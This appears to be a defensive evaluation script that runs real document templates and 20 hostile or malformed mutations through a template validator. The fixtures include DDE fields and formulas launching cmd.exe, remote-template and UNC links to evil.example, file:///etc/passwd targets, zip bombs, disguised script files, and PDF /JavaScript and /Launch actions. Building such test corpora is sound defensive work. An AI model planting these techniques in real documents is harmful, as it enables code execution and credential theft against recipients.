// Template-validator eval: 5 real templates from the repo's templates/ tree and 20 hostile or malformed packages (mostly
// mutations of a real template) through unpack() + the REAL template validator (static checks only: no officecli binary).
// Run: node evals/run-template-validator.ts   (npm run eval:templates)
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { strToU8, unzipSync, zipSync, type Zippable } from 'fflate';
import { MANIFEST_NAME, sha256Hex } from '../src/marketplace/artifacts.ts';
import { runEval, repoRoot, type Case } from './lib.ts';

const tpl = (rel: string) => new Uint8Array(readFileSync(join(repoRoot, 'templates', rel)));
const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
type Format = 'pptx' | 'docx' | 'xlsx' | 'pdf';

function pack(format: Format, file: Uint8Array, previews: Record<string, Uint8Array> = { 'previews/1.png': PNG }): Uint8Array {
  const files: Record<string, Uint8Array> = { [`template.${format}`]: file, ...previews };
  const manifest = { schema: 'agentic.marketplace/1', id: 'eval/template', type: 'template', version: '1.0.0', title: 'Eval template', summary: 'An eval template.', license: 'MIT', compat: { app: '*' },
    dependencies: [], permissions: [], files: Object.entries(files).map(([path, b]) => ({ path, sha256: sha256Hex(b), size: b.length })),
    payload: { format, file: `template.${format}`, previews: Object.keys(previews) } };
  return zipSync({ [MANIFEST_NAME]: strToU8(JSON.stringify(manifest)), ...files });
}
const mutate = (b: Uint8Array, edit: (z: Record<string, Uint8Array>) => void): Uint8Array => { const z = unzipSync(b); edit(z); return zipSync(z as Zippable); };
const T = (t: string) => `http://schemas.openxmlformats.org/officeDocument/2006/relationships/${t}`;
const R = (inner: string) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${inner}</Relationships>`;
const utf16 = (s: string) => { const b = new Uint8Array(2 + s.length * 2); b[0] = 0xff; b[1] = 0xfe; for (let i = 0; i < s.length; i++) { b[2 + 2 * i] = s.charCodeAt(i) & 255; b[3 + 2 * i] = s.charCodeAt(i) >> 8; } return b; };
const dec = (b: Uint8Array) => new TextDecoder().decode(b);

const PPTX = tpl('pptx/board-update.pptx'), DOCX = tpl('docx/board-memo.docx'), XLSX = tpl('xlsx/budget-tracker.xlsx');

const ok = (id: string, note: string, build: () => Uint8Array): Case => ({ id, label: 'benign', category: 'real-template', note, build });
const bad = (id: string, category: string, note: string, build: () => Uint8Array): Case => ({ id, label: 'malicious', category, note, build });

const cases: Case[] = [
  ok('t01-pptx-board-update', 'templates/pptx/board-update.pptx', () => pack('pptx', PPTX)),
  ok('t02-pptx-investor-pitch', 'templates/pptx/investor-pitch.pptx', () => pack('pptx', tpl('pptx/investor-pitch.pptx'))),
  ok('t03-docx-board-memo', 'templates/docx/board-memo.docx', () => pack('docx', DOCX)),
  ok('t04-xlsx-budget-tracker', 'templates/xlsx/budget-tracker.xlsx', () => pack('xlsx', XLSX)),
  ok('t05-pdf-one-pager', 'templates/pdf/one-pager.pdf', () => pack('pdf', tpl('pdf/one-pager.pdf'))),

  bad('x01-macro-vba', 'macro', 'pptx with ppt/vbaProject.bin', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/vbaProject.bin'] = new Uint8Array([1, 2, 3]); }))),
  bad('x02-macro-content-type', 'macro', 'main part declared macroEnabled in [Content_Types].xml', () => pack('docx', mutate(DOCX, (z) => {
    z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml', 'application/vnd.ms-word.document.macroEnabled.main+xml'));
  }))),
  bad('x03-external-http-link', 'external-link', 'relationship with TargetMode External to http://', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/x.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('attachedTemplate')}" Target="http://evil.example/t.dotm" TargetMode="External"/>`)); }))),
  bad('x04-external-unc', 'external-link', 'UNC path target (credential leak via SMB)', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/x.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('oleObject')}" Target="\\\\evil.example\\share\\x" TargetMode="External"/>`)); }))),
  bad('x05-external-scheme-relative', 'external-link', 'scheme-relative //host target', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/_rels/y.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="//evil.example/x" TargetMode="External"/>`)); }))),
  bad('x06-external-file-uri', 'external-link', 'file:/// target', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/_rels/y.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="file:///etc/passwd" TargetMode="External"/>`)); }))),
  bad('x07-dde-docx-field', 'dde', 'DDEAUTO field launching cmd.exe in word/document.xml', () => pack('docx', mutate(DOCX, (z) => {
    z['word/document.xml'] = strToU8(dec(z['word/document.xml']).replace('</w:body>', '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body>'));
  }))),
  bad('x08-dde-xlsx-formula', 'dde', 'DDE formula =cmd|... in a worksheet cell', () => pack('xlsx', mutate(XLSX, (z) => {
    const k = Object.keys(z).find((n) => /^xl\/worksheets\/sheet\d+\.xml$/.test(n))!;
    z[k] = strToU8(dec(z[k]).replace('</sheetData>', `<row r="999"><c r="A999"><f>cmd|' /C calc'!A0</f></c></row></sheetData>`));
  }))),
  bad('x09-zip-bomb', 'bomb', 'a 80 MiB all-zero part (over the 64 MiB package cap once inflated)', () => zipSync({ ...unzipSync(pack('pptx', PPTX)), 'ppt/bomb.bin': new Uint8Array(80 * 1024 * 1024) } as Zippable, { level: 1 })),
  bad('x10-truncated', 'malformed', 'the pptx cut in half', () => pack('pptx', PPTX.slice(0, PPTX.length >> 1))),
  bad('x11-no-content-types', 'malformed', '[Content_Types].xml removed', () => pack('docx', mutate(DOCX, (z) => { delete z['[Content_Types].xml']; }))),
  bad('x12-override-missing-part', 'malformed', 'an Override names a part that is not in the package', () => pack('docx', mutate(DOCX, (z) => {
    z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', '<Override PartName="/word/ghost.xml" ContentType="application/xml"/></Types>'));
  }))),
  bad('x13-svg-preview', 'disguised-file', 'an SVG with script named previews/1.png', () => pack('pptx', PPTX, { 'previews/1.png': strToU8('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>') })),
  bad('x14-html-as-pptx', 'disguised-file', 'an HTML page named template.pptx', () => pack('pptx', strToU8('<html><script>location="http://evil.example"</script></html>'))),
  bad('x15-elf-in-embeddings', 'executable', 'ELF magic in a non-XML part', () => pack('pptx', mutate(PPTX, (z) => { z['ppt/media/extra.dat'] = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0, 0, 0]); }))),
  bad('x16-case-variant-attributes', 'evasion', 'duplicate Target attributes differing only by case, hiding a file: target', () => pack('docx', mutate(DOCX, (z) => {
    z['word/_rels/x.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="https://example.com/ok" TARGET="file:///etc/passwd" TargetMode="External"/>`));
  }))),
  bad('x17-utf16-rels', 'evasion', 'a UTF-16LE rels file with a file: external target', () => pack('docx', mutate(DOCX, (z) => { z['word/_rels/x.rels'] = utf16(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="file:///etc/passwd" TargetMode="External"/>`)); }))),
  bad('x18-nested-workbook-bomb', 'bomb', '40 embedded chart workbooks of 60 MiB each', () => {
    const big = zipSync({ 'xl/big.bin': new Uint8Array(60 * 1024 * 1024) }, { level: 1 });
    return pack('pptx', mutate(PPTX, (z) => {
      const rk = Object.keys(z).find((n) => /charts\/_rels\/.*\.rels$/.test(n))!;
      let rels = '';
      for (let i = 0; i < 40; i++) { z[`ppt/embeddings/w${i}.xlsx`] = big; rels += `<Relationship Id="r${i}" Type="${T('package')}" Target="../embeddings/w${i}.xlsx"/>`; }
      z[rk] = strToU8(R(rels));
    }));
  }),
  bad('x19-pdf-javascript', 'pdf-active', 'PDF with /JavaScript in an OpenAction', () => pack('pdf', strToU8('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n'))),
  bad('x20-pdf-launch', 'pdf-active', 'PDF with a /Launch action', () => pack('pdf', strToU8('%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /Launch /F (cmd.exe) >> >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n'))),
];

process.exit(await runEval('template-validator', 'Template validator eval', cases, 'template', [
  'Static checks over a fixed corpus of 25 packages (5 real, 20 hostile or malformed): a regression gate, not a proof that every hostile Office file is caught.',
  'The renderer check (officecli-open) is not run: it needs the OfficeCLI binary and is injected in production. Passing here means the static structure and active-content scan passed.',
  'The PDF check is a heuristic byte scan for /JavaScript, /Launch and similar names (with name-escape handling); it is not a PDF parser.',
  'Hostile Office files that rely on application behavior (DDE, remote template injection through unusual relationship types, formula injection) are only caught where the scanner has a rule for them; see known gaps.',
  'Mutations are built from the repo\'s own templates, so exotic real-world malware families are not represented.',
]));
